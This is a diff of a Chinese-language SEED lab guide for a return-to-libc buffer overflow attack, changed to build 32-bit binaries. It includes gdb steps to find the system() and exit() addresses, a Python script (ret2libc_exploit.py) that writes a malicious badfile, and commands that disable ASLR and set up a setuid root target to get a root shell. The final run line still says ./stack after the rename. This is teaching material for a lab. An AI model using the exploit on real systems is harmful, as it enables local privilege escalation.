@@ -2,6 +2,8 @@
 
 ## 1. 环境准备
 
+> 注：本实验指南已经考虑对SEED VM Ubuntu 20.04-64bit和Ubuntu 16.04-32bit的环境兼容
+
 (关闭地址随机化) `sudo sysctl -w kernel.randomize_va_space=0`
 
 (创建漏洞程序) 程序源码如下：
@@ -31,18 +33,18 @@ int main(int argc, char **argv) {
 
 ```
 
-(编译程序并设置为setuid程序)
+(编译32位程序并设置为setuid程序)
 ```bash
-gcc -fno-stack-protector -z noexecstack -o stack stack.c
-sudo chown root stack
-sudo chmod 4755 stack
+gcc -m32 -fno-stack-protector -z noexecstack -o stack_32 stack.c
+sudo chown root stack_32
+sudo chmod 4755 stack_32
 ```
 
 ## 2. 通过调试找到system与exit函数地址
 
 ```bash
 $ touch badfile
-$ gdb -q stack
+$ gdb -q stack_32
 $ r
 $ p system
 # 此处输出system函数地址
@@ -69,32 +71,33 @@ int main() {
 	return 1;
 }
 ```
-随后编译并打印环境变量地址：
+随后编译并打印环境变量地址（**特别注意**，要开启`-m32`将env55也编译为32位，和stack_32保持一致性）：
 ```bash
-gcc envaddr.c -o env55
+gcc -m32 envaddr.c -o env55
 export MYSHELL="/bin/sh"
 ./env55
-# 此处会打印出环境变量MYSHELL的地址
+# 此处会打印出环境变量MYSHELL的地址，在我的机器上是Address: ffffd495
 ```
 
 ## 4. 构建恶意输入badfile
 
 首先通过调试找到main调用foo函数时，ebp与buffer的地址：
 ```bash
-$ gcc -fno-stack-protector -z noexecstack -g -o stack_dbg stack.c
+$ gcc -m32 -fno-stack-protector -z noexecstack -g -o stack_32_dbg stack.c
 $ touch badfile
-$ gdb -q stack_dbg
+$ gdb -q stack_32_dbg
 $ b foo
 $ r
+$ n
 $ p $ebp
-# 此处输出ebp的地址，我的机器为0xbfffeb78
+# 此处输出ebp的地址，我的机器为0xffffd018
 $ p &buffer
-# 此处输出buffer的地址，我的机器为0xbfffeb0c
-$ p/d 0xbfffeb78 - 0xbfffeb0c
+# 此处输出buffer的地址，我的机器为0xffffcfac
+$ p/d 0xffffd018 - 0xffffcfac
 108 # 该差值在不同机器一致
 ```
 
-编写python脚本(libc_exploit.py)生成badfile
+编写python脚本(ret2libc_exploit.py)生成badfile
 
 ```python
 #!/usr/bin/python3
@@ -103,13 +106,13 @@ import sys
 
 content = bytearray(0xaa for i in range(300))
 
-a3 = 0xbffffe1e # address of 'bin/sh'
+a3 = 0xffffd495 # address of 'bin/sh'
 content[120:124] = (a3).to_bytes(4, byteorder='little')
 
-a2 = 0xb7e369d0 # address of exit() function
+a2 = 0xf7e04f80 # address of exit() function
 content[116:120] = (a2).to_bytes(4, byteorder='little')
 
-a1 = 0xb7e42da0 # address of system() function
+a1 = 0xf7e12420 # address of system() function
 content[112:116] = (a1).to_bytes(4, byteorder='little')
 
 with open('badfile', 'wb') as wb:
@@ -120,8 +123,8 @@ with open('badfile', 'wb') as wb:
 
 ```bash
 # 生成badfile
-chmod u+x libc_exploit.py
-./libc_exploit.py
+chmod u+x ret2libc_exploit.py
+./ret2libc_exploit.py
 ```
 
 ## 5. 发起攻击
@@ -129,7 +132,7 @@ chmod u+x libc_exploit.py
 ```bash
 # 让/bin/sh指向/bin/zsh
 sudo ln -sf /bin/zsh /bin/sh
-# 执行stack
+# 执行stack_32
 ./stack
 # 此时应该得到shell, 使用id查看权限
 id
